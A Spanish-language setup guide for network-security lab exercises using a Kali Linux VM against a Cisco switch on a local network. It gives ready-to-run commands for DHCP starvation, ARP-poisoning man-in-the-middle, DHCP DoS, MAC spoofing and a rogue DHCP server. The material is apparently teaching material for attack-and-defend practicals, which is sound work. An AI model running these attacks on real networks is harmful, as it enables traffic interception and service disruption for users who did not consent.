# Setup para Prácticas con Kali Linux VM

## ✅ Ventajas de Usar Kali Linux

Kali Linux viene con **TODAS** las herramientas de seguridad preinstaladas:

| Herramienta | Estado en Kali | Comando de verificación |
|-------------|----------------|------------------------|
| **Yersinia** | ✅ Preinstalado | `yersinia -V` |
| **Ettercap** | ✅ Preinstalado | `ettercap --version` |
| **Wireshark** | ✅ Preinstalado | `wireshark --version` |
| **nmap** | ✅ Preinstalado | `nmap --version` |
| **arp-scan** | ✅ Preinstalado | `arp-scan --version` |
| **tcpdump** | ✅ Preinstalado | `tcpdump --version` |
| **dnsmasq** | ✅ Preinstalado | `dnsmasq --version` |

**No necesitas instalar NADA** - todo está listo para usar.

---

## 🔧 Configuración de Red de la VM

### Paso 1: Configurar el Adaptador de Red

Para que la VM de Kali pueda atacar dispositivos en tu red física (incluyendo el switch Cisco en 192.168.1.237), necesitas configurar la red en modo **Bridged** (Puente).

#### VirtualBox:
1. Apaga la VM si está encendida
2. Selecciona tu VM de Kali
3. Ve a **Settings** > **Network** > **Adapter 1**
4. Cambia "Attached to:" a **Bridged Adapter**
5. Selecciona tu interfaz física de red (WiFi o Ethernet)
6. Marca la opción **Promiscuous Mode: Allow All** (importante para capturar todo el tráfico)
7. Guarda y arranca la VM

#### VMware Fusion/Workstation:
1. Apaga la VM si está encendida
2. Ve a **Settings** > **Network Adapter**
3. Selecciona **Bridged Networking**
4. Marca **Replicate physical network connection state**
5. En "Advanced", selecciona **Promiscuous Mode**
6. Guarda y arranca la VM

---

### Paso 2: Verificar Conectividad en Kali

Una vez que arranques Kali con red en modo Bridged:

```bash
# 1. Verificar tu interfaz de red
ip addr show
# O
ifconfig

# Busca la interfaz eth0 o similar con una IP en el rango 192.168.1.x

# 2. Verificar que tienes IP en la misma red
ip addr show eth0 | grep "inet "
# Deberías ver algo como: inet 192.168.1.XXX/24

# 3. Hacer ping al switch Cisco
ping -c 4 192.168.1.237

# 4. Hacer ping al router/gateway
ping -c 4 192.168.1.1

# 5. Escanear la red para ver todos los dispositivos
sudo arp-scan -l
```

Si no tienes IP o no está en el rango 192.168.1.x:

```bash
# Solicitar IP por DHCP
sudo dhclient eth0
# O
sudo dhclient -r && sudo dhclient

# Verificar de nuevo
ip addr show eth0
```

---

## 🎯 Verificación de Herramientas en Kali

Ejecuta este script en Kali para verificar que todo está instalado:

```bash
#!/bin/bash

echo "============================================="
echo "  VERIFICACIÓN DE HERRAMIENTAS - KALI LINUX"
echo "============================================="
echo ""

# Función para verificar herramienta
check_tool() {
    local tool=$1
    local version_cmd=$2

    echo -n "Verificando $tool... "
    if command -v $tool &> /dev/null; then
        version=$($version_cmd 2>&1 | head -n 1)
        echo "✅ $version"
        return 0
    else
        echo "❌ No instalado"
        return 1
    fi
}

# Verificar todas las herramientas
check_tool "yersinia" "yersinia -V"
check_tool "ettercap" "ettercap --version"
check_tool "wireshark" "wireshark --version"
check_tool "tshark" "tshark --version"
check_tool "nmap" "nmap --version"
check_tool "arp-scan" "arp-scan --version"
check_tool "tcpdump" "tcpdump --version"
check_tool "dnsmasq" "dnsmasq --version"
check_tool "macchanger" "macchanger --version"

echo ""
echo "============================================="
echo "  VERIFICACIÓN DE RED"
echo "============================================="
echo ""

# Mostrar interfaces de red
echo "Interfaces de red disponibles:"
ip -br addr show | grep -v "lo"

echo ""

# Mostrar ruta por defecto
echo "Gateway/Router:"
ip route show default

echo ""

# Verificar conectividad
echo "Probando conectividad con switch (192.168.1.237)..."
if ping -c 2 -W 2 192.168.1.237 &> /dev/null; then
    echo "✅ Switch Cisco es accesible"
else
    echo "❌ No se puede alcanzar el switch"
    echo "   Verifica que la VM esté en modo Bridge"
fi

echo ""
```

Guarda esto como `verify_kali.sh`, hazlo ejecutable y ejecútalo:

```bash
chmod +x verify_kali.sh
./verify_kali.sh
```

---

## 📚 Uso de las Herramientas en Kali

### Yersinia (DHCP Starvation)

```bash
# Modo gráfico (requiere X11)
sudo yersinia -G

# Modo texto interactivo
sudo yersinia -I

# DHCP Attack directo desde terminal
sudo yersinia -attack 1 -interface eth0 dhcp

# Ver opciones de ataque
yersinia -help
```

### Ettercap (ARP Poisoning / MITM)

```bash
# Modo gráfico
sudo ettercap -G

# ARP Poisoning entre router y víctima
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//
#                                              ↑ Router      ↑ Víctima

# DHCP DoS con ettercap
sudo ettercap -T -q -i eth0 -P dhcp_dos

# Ver todos los plugins disponibles
ettercap -P list
```

### Wireshark

```bash
# Modo gráfico
sudo wireshark &

# Modo terminal (tshark)
sudo tshark -i eth0

# Capturar y guardar a archivo
sudo tshark -i eth0 -w captura.pcap

# Filtrar solo DHCP
sudo tshark -i eth0 -f "port 67 or port 68"
```

### nmap

```bash
# Escanear toda la red
sudo nmap -sn 192.168.1.0/24

# Escanear puertos del switch
sudo nmap -p- 192.168.1.237

# Detección de OS
sudo nmap -O 192.168.1.237

# Escaneo completo y agresivo
sudo nmap -A -T4 192.168.1.237
```

### arp-scan

```bash
# Escanear red local
sudo arp-scan -l

# Escanear rango específico
sudo arp-scan 192.168.1.0/24

# Mostrar fabricantes de las MACs
sudo arp-scan -l | grep -i cisco
```

---

## 🎯 Configuración Específica por Práctica

### Práctica 1: DHCP Starvation

**Herramienta principal:** Yersinia

```bash
# Identificar tu interfaz
ifconfig

# Iniciar Yersinia en modo gráfico
sudo yersinia -G

# En la interfaz:
# 1. Selecciona "DHCP"
# 2. Haz clic en "Discover" para encontrar el servidor DHCP
# 3. Click derecho > "Start attack"
# 4. Selecciona "sending DISCOVER packet" (Attack 1)
```

**Captura de evidencia:**
```bash
# En otra terminal, captura el tráfico
sudo wireshark &
# Filtra por: bootp || dhcp
```

---

### Práctica 2: ARP Poisoning MITM

**Herramienta principal:** Ettercap + Wireshark

```bash
# Paso 1: Escanear la red para identificar objetivos
sudo nmap -sn 192.168.1.0/24

# Paso 2: Identificar router y víctima
# Router: 192.168.1.1
# Víctima: (otra PC en la red)

# Paso 3: Iniciar Wireshark
sudo wireshark &

# Paso 4: ARP Poisoning con Ettercap
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.XXX//

# Ahora todo el tráfico entre la víctima y el router pasa por tu Kali
```

---

### Práctica 3: Ciclo NIST

Combinación de varias herramientas según la fase del framework.

---

### Práctica 4: Port Security

```bash
# Ver tu MAC actual
ip link show eth0 | grep "link/ether"

# Cambiar MAC (para probar port security)
sudo macchanger -m AA:BB:CC:DD:EE:FF eth0

# Restaurar MAC original
sudo macchanger -p eth0
```

---

### Práctica 5: Rogue DHCP

**Opción A: Con Ettercap**
```bash
# Editar el archivo de configuración
sudo nano /etc/ettercap/etter.conf

# Buscar la sección [dhcp_server] y configurar:
# dhcp_pool = 192.168.1.100-192.168.1.200
# dhcp_router = 192.168.1.254  # Tu IP de Kali
# dhcp_dns = 8.8.8.8

# Ejecutar
sudo ettercap -T -q -i eth0 -P dhcp_server
```

**Opción B: Con dnsmasq**
```bash
# Configurar dnsmasq
sudo nano /etc/dnsmasq.conf

# Añadir:
interface=eth0
dhcp-range=192.168.1.100,192.168.1.200,12h
dhcp-option=3,192.168.1.254  # Tu IP como gateway
dhcp-option=6,8.8.8.8        # DNS

# Iniciar servicio
sudo systemctl start dnsmasq

# Ver logs
sudo journalctl -u dnsmasq -f
```

---

## 🛡️ Buenas Prácticas

### Antes de Cada Práctica

```bash
# 1. Verificar que estás en la red correcta
ip addr show | grep "inet 192.168.1"

# 2. Hacer ping al switch
ping -c 2 192.168.1.237

# 3. Escanear la red para identificar dispositivos
sudo arp-scan -l

# 4. Preparar Wireshark para captura
sudo wireshark &
```

### Durante la Práctica

1. **Siempre captura evidencia** con Wireshark antes de lanzar ataques
2. **Documenta cada comando** que ejecutas
3. **Toma capturas de pantalla** de los resultados
4. **Verifica el impacto** en la víctima antes de implementar defensas

### Después de la Práctica

```bash
# 1. Detener todos los ataques activos
# Ctrl+C en las terminales con herramientas corriendo

# 2. Restaurar tu MAC si la cambiaste
sudo macchanger -p eth0

# 3. Limpiar reglas de iptables si las modificaste
sudo iptables -F

# 4. Reiniciar interfaz de red
sudo ifconfig eth0 down && sudo ifconfig eth0 up
# O
sudo ip link set eth0 down && sudo ip link set eth0 up
```

---

## 🔍 Troubleshooting Común

### Problema: No veo dispositivos en la red

```bash
# Verificar modo promiscuo
sudo ip link set eth0 promisc on

# Re-escanear
sudo arp-scan -l
```

### Problema: Wireshark no captura paquetes

```bash
# Dar permisos a tu usuario
sudo usermod -aG wireshark $USER

# O ejecutar con sudo
sudo wireshark
```

### Problema: "Permission denied" en herramientas

Todas las herramientas de ataque requieren permisos de root en Kali:

```bash
# Siempre usa sudo
sudo yersinia -G
sudo ettercap -G
sudo wireshark
```

### Problema: No puedo hacer ping al switch (192.168.1.237)

1. Verifica que la VM esté en modo **Bridge**
2. Verifica que tienes IP en 192.168.1.x:
   ```bash
   ip addr show
   ```
3. Si no tienes IP correcta:
   ```bash
   sudo dhclient -r
   sudo dhclient
   ```
4. Verifica que el switch esté encendido y conectado

---

## 📊 Comparación: macOS vs Kali VM

| Aspecto | macOS | Kali VM |
|---------|-------|---------|
| **Instalación de herramientas** | Manual, parcial | ✅ Todo preinstalado |
| **Yersinia** | ❌ No disponible | ✅ Preinstalado |
| **Permisos** | Complicado | ✅ Sudo directo |
| **Rendimiento** | Nativo | VM (overhead) |
| **Compatibilidad** | Limitada | ✅ 100% compatible |
| **Recomendación** | Para defensa | ✅ **Para ataque** |

---

## 🎯 Recomendación Final

### Setup Ideal para las Prácticas:

1. **PC Atacante:** Kali Linux VM (tienes todo listo)
   - Yersinia, Ettercap, Wireshark, nmap, etc.
   - Configurada en modo Bridge

2. **PC Defensor:** macOS (tu máquina host)
   - Navegador para acceder al switch (https://192.168.1.237)
   - Wireshark para monitoreo (instálalo con: `brew install --cask wireshark`)
   - Terminal para comandos básicos

### Workflow Recomendado:

```
┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
│   Kali VM       │         │   Switch Cisco  │         │   macOS Host    │
│   (Atacante)    │────────▶│   192.168.1.237 │◀────────│   (Defensor)    │
│                 │         │                 │         │                 │
│ • Yersinia      │  Ataque │ • Víctima del   │ Config  │ • Browser       │
│ • Ettercap      │────────▶│   ataque        │◀────────│ • Wireshark     │
│ • Wireshark     │         │ • Aplicación de │         │ • Monitoring    │
│   (captura)     │         │   defensas      │         │                 │
└─────────────────┘         └─────────────────┘         └─────────────────┘
```

---

## 📋 Checklist Pre-Práctica

En Kali VM:

- [ ] VM configurada en modo **Bridged**
- [ ] Modo **Promiscuous** activado
- [ ] IP en rango 192.168.1.x obtenida
- [ ] Ping exitoso a 192.168.1.237 (switch)
- [ ] Ping exitoso a 192.168.1.1 (router)
- [ ] Todas las herramientas verificadas (`./verify_kali.sh`)
- [ ] Wireshark iniciado y listo para capturar

---

**¡Con Kali VM tienes todo listo para realizar TODAS las prácticas sin instalar nada adicional!** 🎉

Es la mejor opción para el rol de atacante en las prácticas.
